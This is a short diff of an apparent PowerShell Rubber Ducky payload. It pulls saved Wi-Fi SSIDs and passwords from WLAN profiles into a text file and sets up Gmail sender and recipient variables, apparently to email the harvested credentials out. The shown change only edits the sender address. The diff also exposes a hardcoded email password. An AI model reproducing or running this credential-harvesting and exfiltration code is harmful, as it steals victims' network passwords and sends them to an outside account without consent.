@@ -10,7 +10,7 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
-$FROM = "patitodegoma@gmail.com"
+$FROM = "patitodegoma404@gmail.com"
 $PASS = "RubberDucky404!"
 $TO = "tomassj9@gmail.com"
 
